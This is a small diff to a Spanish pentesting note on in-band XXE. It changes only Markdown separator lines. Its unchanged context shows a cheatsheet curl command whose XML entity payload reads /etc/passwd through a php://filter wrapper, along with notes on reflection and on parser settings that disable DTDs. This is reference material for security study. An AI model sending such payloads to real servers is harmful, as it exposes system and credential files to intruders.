@@ -17,7 +17,7 @@ linked:
 ---
 # XXE - Clásico In-band
 
-***
+---
 
 ## Cheatsheet
 
@@ -49,7 +49,7 @@ curl -X POST https://target/api -H 'Content-Type: application/xml' \
   --data '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>'
 ```
 
-___
+---
 
 ## Overview
 
@@ -61,4 +61,4 @@ XXE _in-band_ ocurre cuando la aplicación procesa un documento XML de forma ins
 - **Reflejo:** la entidad `&xxe;` debe estar en el nodo que la aplicación devuelve. Si no se refleja → pivotar a [[XXE - Out-of-Band (OOB) y DTDs Externos]].
 - **DTDs deshabilitados:** parsers modernos (Java SAX/StAX con `supportDTD=false`, .NET con `DtdProcessing=Prohibit`) rechazan el `DOCTYPE` antes de procesar entities.
 
-***
+---
